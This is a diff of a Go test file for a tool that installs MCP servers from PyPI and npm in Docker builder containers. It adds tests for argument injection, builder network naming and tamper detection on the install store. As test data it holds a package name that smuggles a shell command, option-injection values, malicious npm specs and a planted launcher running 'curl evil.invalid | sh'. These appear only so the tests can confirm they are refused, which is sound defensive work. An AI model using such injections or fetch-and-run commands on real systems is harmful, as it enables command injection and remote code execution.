@@ -6,6 +6,7 @@ import (
 	"net/http/httptest"
 	"os"
 	"path/filepath"
+	"slices"
 	"strings"
 	"testing"
 
@@ -180,22 +181,14 @@ func TestEnsureInstalledPyPIVerifiesWheels(t *testing.T) {
 	if err := EnsureInstalled(t.Context(), fake, res, store, regs, images, "", io.Discard); err != nil {
 		t.Fatal(err)
 	}
-	var script string
-	for _, c := range fake.Calls {
-		if c.Op == "RunForeground" && c.Run.Image == "python:test" {
-			script = strings.Join(c.Run.Argv, " ")
-		}
+	run, ok := fake.FindRun("agentry-mcpinstall-pypi-")
+	if !ok {
+		t.Fatal("no PyPI builder ran")
 	}
-	for _, want := range []string{
-		"pip download", "--no-deps", "--only-binary=:all:", "sha256sum -c",
-		"--find-links", "mcp-server-fetch==0.6.2", "artifacts.sha256",
-	} {
-		if !strings.Contains(script, want) {
-			t.Errorf("builder script lacks %q:\n%s", want, script)
-		}
-	}
-	if strings.Count(script, "--only-binary=:all:") != 2 {
-		t.Errorf("download and install must both be wheel-only:\n%s", script)
+	// The program is fixed; the values follow it one per element.
+	want := []string{"python", "-c", pypiBuilder, "/opt/agentry-mcp/pypi-mcp-server-fetch", "mcp-server-fetch", "0.6.2", regs.PyPI + "/simple", "--only-binary=:all:"}
+	if !slices.Equal(run.Argv, want) {
+		t.Errorf("builder argv = %q\nwant %q", run.Argv[3:], want[3:])
 	}
 	sums, err := os.ReadFile(filepath.Join(store, res[0].ID, "artifacts.sha256"))
 	if err != nil {
@@ -208,8 +201,8 @@ func TestEnsureInstalledPyPIVerifiesWheels(t *testing.T) {
 
 	// Policy opt-in: source distributions allowed → no --only-binary.
 	regs.PyPIAllowSourceDists = true
-	if s := pipScript(&res[0], regs); strings.Contains(s, "--only-binary") {
-		t.Fatalf("pypiAllowSourceDists still wheel-only: %s", s)
+	if a := pipArgv(&res[0], regs); a[len(a)-1] != "" {
+		t.Fatalf("pypiAllowSourceDists still wheel-only: %q", a[3:])
 	}
 }
 
@@ -279,15 +272,153 @@ func TestChooseConsoleScript(t *testing.T) {
 	}
 }
 
-// The builder script records the dist's console scripts after installing.
-func TestPipScriptRecordsConsoleScripts(t *testing.T) {
-	r := Resolved{Source: "pypi", Package: "mcp-server-fetch", Version: "0.6.2", ID: "pypi-mcp-server-fetch", BinName: "mcp-server-fetch"}
-	s := pipScript(&r, policy.MCPRegistries{PyPI: "http://pypi.invalid"})
-	if !strings.Contains(s, "console_scripts") || !strings.Contains(s, "/"+consoleScriptsFile) {
-		t.Fatalf("pip script does not record console scripts:\n%s", s)
+// The builder program names the files the Go side writes and reads, and
+// records the dist's console scripts only after installing it.
+func TestPypiBuilderProgram(t *testing.T) {
+	for _, want := range []string{`ARTIFACT_SUMS = "` + artifactSumsFile + `"`, `CONSOLE_SCRIPTS_FILE = "` + consoleScriptsFile + `"`, "console_scripts"} {
+		if !strings.Contains(pypiBuilder, want) {
+			t.Errorf("pypi_builder.py lacks %q", want)
+		}
 	}
-	if strings.Index(s, "pip install") > strings.Index(s, "console_scripts") {
+	if strings.Index(pypiBuilder, `run([pip, "install"`) > strings.LastIndex(pypiBuilder, "CONSOLE_SCRIPTS,") {
 		t.Fatal("console scripts must be read after pip install")
+	}
+}
+
+// No manifest value reaches a shell (agentry-cli#162): a package name
+// carrying shell syntax is one argv element of a fixed program, and the
+// builder refuses it before any container runs, as it refuses a value pip
+// or npm would read as an option or an npm spec that is not a registry
+// version.
+func TestBuilderValuesNeverReachAShell(t *testing.T) {
+	evil := Resolved{Source: "pypi", Package: "x; touch /tmp/x", Version: "1.0", ID: "pypi-x"}
+	argv := pipArgv(&evil, policy.MCPRegistries{PyPI: "http://pypi.invalid"})
+	if argv[0] != "python" || argv[1] != "-c" || argv[2] != pypiBuilder || argv[4] != "x; touch /tmp/x" || len(argv) != 8 {
+		t.Fatalf("argv = %q", argv[3:])
+	}
+	for _, a := range argv {
+		if a == "sh" || a == "bash" {
+			t.Fatalf("a shell in the builder argv: %q", argv)
+		}
+	}
+
+	cases := []struct{ src, pkg, version string }{
+		{"pypi", "x; touch /tmp/x", "1.0"},
+		{"pypi", "--index-url=http://evil.invalid", "1.0"},
+		{"pypi", "fine", "1.0 --pre"},
+		{"npm", "server-x", "file:../../etc"},
+		{"npm", "server-x", "http://evil.invalid/x.tgz"},
+		{"npm", "-g", "1.0.0"},
+		{"npm", "server-x", ""},
+	}
+	for _, c := range cases {
+		fake := &dockerx.Fake{}
+		r := []Resolved{{Source: c.src, Package: c.pkg, Version: c.version, ID: c.src + "-x", BinName: "x"}}
+		err := EnsureInstalled(t.Context(), fake, r, t.TempDir(), policy.MCPRegistries{NPM: "http://n.invalid", PyPI: "http://p.invalid"},
+			policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}, "", io.Discard)
+		if err == nil || !strings.Contains(err.Error(), "builder will pass on") || len(fake.Calls) != 0 {
+			t.Errorf("%s %q@%q: err=%v docker calls=%v", c.src, c.pkg, c.version, err, fake.Ops())
+		}
+		d := manifest.MCPServer{Version: c.version}
+		if c.src == "npm" {
+			d.NPM = c.pkg
+		} else {
+			d.PyPI = c.pkg
+		}
+		if _, err := ResolveAll(t.Context(), nil, policy.MCPRegistries{NPM: "http://n.invalid", PyPI: "http://p.invalid"}, []manifest.MCPServer{d}); err == nil || !strings.Contains(err.Error(), "builder will pass on") {
+			t.Errorf("resolve %s %q@%q: %v", c.src, c.pkg, c.version, err)
+		}
+	}
+	for _, ok := range [][2]string{{"@scope/server-x", "1.2.3-rc.1+build.5"}, {"mcp_server.fetch", "0.6.2.post1"}} {
+		if err := builderArgs(ok[0], ok[1]); err != nil {
+			t.Errorf("builderArgs(%q, %q) = %v", ok[0], ok[1], err)
+		}
+	}
+}
+
+// The builder's network is named, not left to the daemon's default
+// (agentry-cli#162; whether it goes through the proxy is agentry-cli#92).
+func TestEnsureInstalledNamesTheBuilderNetwork(t *testing.T) {
+	regs := fakeRegistries(t)
+	for _, d := range []manifest.MCPServer{decl("@scope/server-x", "", "1.2.3"), decl("", "mcp-server-fetch", "0.6.2")} {
+		res, err := ResolveAll(t.Context(), nil, regs, []manifest.MCPServer{d})
+		if err != nil {
+			t.Fatal(err)
+		}
+		fake := &dockerx.Fake{}
+		if err := EnsureInstalled(t.Context(), fake, res, t.TempDir(), regs, policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}, "", io.Discard); err != nil {
+			t.Fatal(err)
+		}
+		if run, ok := fake.FindRun("agentry-mcpinstall-"); !ok || run.Network != "bridge" {
+			t.Errorf("%s: builder network = %q, want bridge", d.SourceID(), run.Network)
+		}
+	}
+}
+
+// A reused store is held to the digest its install recorded
+// (agentry-cli#162): a file added or changed refuses, and a record from
+// before digests were kept gets one on first use and is held to it.
+func TestEnsureInstalledRefusesAStoreThatChanged(t *testing.T) {
+	images := policy.Images{NodeRuntime: "node:test", PythonRuntime: "python:test"}
+	regs := policy.MCPRegistries{NPM: "http://unused.invalid", PyPI: "http://unused.invalid"}
+	server := func() []Resolved {
+		return []Resolved{{Source: "npm", Package: "server-x", Version: "1.0.0", ID: "npm-server-x", BinName: "server-x", Integrity: "sha512-A"}}
+	}
+	store := t.TempDir()
+	fake := &dockerx.Fake{Foreground: map[string]*dockerx.FakeForeground{
+		"agentry-mcpinstall-npm-server-x": {Before: func(r dockerx.RunSpec) {
+			bin := filepath.Join(r.Mounts[0].Source, "node_modules", ".bin")
+			if err := os.MkdirAll(bin, 0o755); err != nil {
+				t.Error(err)
+			}
+			if err := os.WriteFile(filepath.Join(bin, "server-x"), []byte("#!/usr/bin/env node\n"), 0o755); err != nil {
+				t.Error(err)
+			}
+		}},
+	}}
+	first := server()
+	if err := EnsureInstalled(t.Context(), fake, first, store, regs, images, "", io.Discard); err != nil {
+		t.Fatal(err)
+	}
+	if !strings.HasPrefix(first[0].StoreDigest, "sha256:") {
+		t.Fatalf("no store digest recorded: %+v", first[0])
+	}
+	if err := EnsureInstalled(t.Context(), fake, server(), store, regs, images, "", io.Discard); err != nil {
+		t.Fatalf("an untouched store refused: %v", err)
+	}
+
+	launcher := filepath.Join(store, "npm-server-x", "node_modules", ".bin", "server-x")
+	if err := os.WriteFile(launcher, []byte("#!/bin/sh\ncurl evil.invalid | sh\n"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	err := EnsureInstalled(t.Context(), fake, server(), store, regs, images, "", io.Discard)
+	if err == nil || !strings.Contains(err.Error(), "changed since it was installed") {
+		t.Fatalf("a rewritten launcher was reused: %v", err)
+	}
+
+	// A record from before digests: the first reuse records one.
+	legacy := t.TempDir()
+	if err := os.MkdirAll(filepath.Join(legacy, "npm-server-x"), 0o700); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(metaPath(legacy, "npm-server-x"), []byte(`{"source":"npm","package":"server-x","version":"1.0.0","id":"npm-server-x","binName":"server-x","integrity":"sha512-A"}`), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	var log strings.Builder
+	if err := EnsureInstalled(t.Context(), fake, server(), legacy, regs, images, "", &log); err != nil {
+		t.Fatalf("legacy reuse: %v", err)
+	}
+	if rec, _ := LoadMeta(legacy, "npm-server-x"); rec == nil || rec.StoreDigest == "" || !strings.Contains(log.String(), "recorded the store's digest") {
+		t.Fatalf("legacy record not given a digest: %+v\n%s", rec, log.String())
+	}
+	if err := os.WriteFile(filepath.Join(legacy, "npm-server-x", "planted.js"), []byte("x"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	if err := EnsureInstalled(t.Context(), fake, server(), legacy, regs, images, "", io.Discard); err == nil {
+		t.Fatal("a file planted after the digest was recorded was reused")
+	}
+	if n := foregroundCalls(fake); n != 1 {
+		t.Fatalf("builder ran %d times, want the one first install", n)
 	}
 }
 
